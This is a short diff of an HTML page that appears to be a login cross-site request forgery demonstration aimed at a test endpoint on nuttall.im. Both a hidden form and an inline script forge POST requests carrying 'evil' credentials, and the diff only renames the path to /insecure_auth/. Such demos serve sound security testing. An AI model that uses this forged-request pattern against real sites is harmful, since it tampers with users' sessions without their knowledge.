@@ -8,7 +8,7 @@
 
   <!--
   <div style="display: hidden;">
-     <form action="https://nuttall.im/auth/", method="post">
+     <form action="https://nuttall.im/insecure_auth/", method="post">
        <input type="hidden" name="username" value="evil" />
        <input type="hidden" name="password" value="evil" />
        <input type="submit" id="formButton" />
@@ -21,7 +21,7 @@
 
 <script language="javascript">
     xmlhttp = new XMLHttpRequest();
-    xmlhttp.open("POST", "https://nuttall.im/auth/", false);
+    xmlhttp.open("POST", "https://nuttall.im/insecure_auth/", false);
     xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
     xmlhttp.send("username=evil-via-xhr&password=f");
   </script>
